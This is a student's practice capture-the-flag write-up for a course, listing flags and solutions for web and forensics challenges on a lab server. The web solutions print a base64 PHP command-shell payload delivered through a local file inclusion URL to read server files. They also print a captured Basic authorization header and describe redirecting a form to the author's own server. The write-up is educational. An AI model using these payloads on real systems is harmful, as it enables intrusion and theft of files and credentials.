@@ -1,0 +1,117 @@
+Remi Trettin
+CIS4930
+Practice CTF
+
+WEB
+Download More RAM
+FLAG: flag{S4V3_5um_RAM_4_7h3_r357_0f_u5}
+Solution: The website said that it is optimized for Internet Exploder. This can be achieved by changing the User Agent header in the HTTP request.
+
+curl -A "Internet Exploder" --verbose http://web.n0l3ptr.com:8080/WebIII/ram.php
+
+This returns a response with a Flag header that can be base64 decoded.
+
+Flag: UzRWM181dW1fUkFNXzRfN2gzX3IzNTdfMGZfdTU=
+
+Top Secret
+FLAG: flag{4CC3$$_gr4n73d_g00d_J0b_h4xx0r!}
+Solution: The website contained a form that runs the javascript GetPassInfo() function when it is submitted. The function is included in the page but it is obfuscated. When the function is deobfuscated:
+
+var array=[
+  "kma0st6odz2onw1a cr4mdr37oqbe8 fre5dyl9xhulg",
+  "charAt",
+  "",
+  "value",
+  "Password1",
+  "forms",
+  "href",
+  "topsecret.php?Result="
+];
+
+function GetPassInfo() {
+  var _0xfbecx2="kma0st6odz2onw1a cr4mdr37oqbe8 fre5dyl9xhulg";
+  var _0xfbecx3="a";
+  var _0xfbecx4="n";
+  var _0xfbecx5=" ";
+  var _0xfbecx6="o";
+  var _0xfbecx7="k";
+  var _0xfbecx8="m";
+  var _0xfbecx9="d";
+  var _0xfbecxa="4";
+  var _0xfbecxb="r";
+  var _0xfbecxc="t";
+  var _0xfbecxd=" ";
+  var _0xfbecxe="r";
+  var _0xfbecxf=" ";
+  var _0xfbecx10="w";
+  var _0xfbecx11="w";
+  var _0xfbecx12="d";
+  var _0xfbecx13="r";
+  var _0xfbecx14="n";
+  var _0xfbecx15=" ";
+  var _0xfbecx16=" ";
+  var _0xfbecx17="4";
+  var _0xfbecx18="u";
+  var _0xfbecx19="h";
+  var _0xfbecx1a="7";
+  var _0xfbecx1b="r";
+  var _0xfbecx1c="f";
+  var _0xfbecx1d=" ";
+  var _0xfbecx1e="1";
+  var _0xfbecx1f="l";
+  var _0xfbecx20="4";
+  var _0xfbecx21="0";
+  var _0xfbecx22=" ";
+  var _0xfbecx23=" ";
+  var _0xfbecx24="l";
+  var _0xfbecx25=" ";
+  var _0xfbecx26="s";
+  var _0xfbecx27="0";
+  var _0xfbecx28="g";
+  var _0xfbecx29="w0rk sm4rt no7 hard 4nd u w1ll  g0 f4r";
+
+  if(document.forms[0].Password1.value === _0xfbecx29){
+    location.href= "topsecret.php?Result="+ _0xfbecx29
+  }
+}
+
+The user is redirected to the same page with a GET parameter. This redirection will show the flag.
+
+Where is WALDO?
+FLAG: flag{y0u_4r3_4_w3b_M4573r_h4xx0r!}
+Solution: I viewed the page source and noticed an odd form input.
+
+<input hidden value="aHR0cDovLzE3Mi4xNy4wLjU6ODA4MC9BUEkvbWFwc2VhcmNoLnBocA==" name="c2VjcmV0" required>
+
+Both the value and name values can be base64 decoded to:
+
+secret=http://172.17.0.5/API/mapsearch.php
+
+172.17.0.5 is a local IP address so it can't be visited directly. If the URL is changed to http://web.n0l3ptr.com/API/mapsearch.php the page loads but presents a 403 forbidden error. The URL that the form sends data to can be changed. I changed it to a server I control and ran tcpdump on that server. The form sends a request like the following:
+
+GET /?lat=32&long=33 HTTP/1.1
+Authorization: Basic TXlTZWN1cmVBUElVc2VyOlN1cGVyU2VjdXJlQVBJUGFzc3dvcmQ=
+Accept: */*
+
+I got around the 403 forbidden error by including the authorization header in my request to the mapsearch.php page. I went back to the Web 2 slides to see the examples again and noticed the practice LFI/RCE URL. Since that practice problem and the CTF problem were on the same server, I could use that to cat the waldo.php source and get the flag instead of fighting with the API/mapsearch.php page.
+
+http://web.n0l3ptr.com:8080/Practice/lfi.php?page=data://text/plain;base64,%20PD9waHANCiRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7DQpzeXN0ZW0oJGNtZCk7Pz4NCg==&cmd=cat%20../WebIII/waldo.php
+
+Out of curiosity I also viewed the source of the mapsearch.php page.
+
+http://web.n0l3ptr.com:8080/Practice/lfi.php?page=data://text/plain;base64,%20PD9waHANCiRjbWQgPSAoJF9SRVFVRVNUWyJjbWQiXSk7DQpzeXN0ZW0oJGNtZCk7Pz4NCg==&cmd=cat%20../API/mapsearch.php
+
+It looks like this was supposed to be a SQL injection problem.
+
+FORENSICS
+Where in the world?
+FLAG: flag{CASINODEMONTECARLO}
+Solution: The provided audio file can be opened in audacity so the morse code can clearly be seen.
+
+-.-. .- ... .. -. --- -.. . -- --- -. - . -.-. .- .-. .-.. ---
+
+This morse code is decoded into the flag.
+
+Did you run strings?
+FLAG: flag{Carmen Sandiego}
+Solution: I ran file on the provided image to see what it was. I gunzip'd the file and ran strings on it. There were too many flag options to start guessing. I ran file again on the gunzip'd file and it was a disk image. I mounted the image in FTK Imager and saw the directory structure with many files that contain potential flags. I went through everything until I got to /oua3BtRtE9/bd252a0728772893 which was shown as being deleted. That file contained a potential flag with a MD5 hash. I used crackstation to reverse the hash and get the real flag.
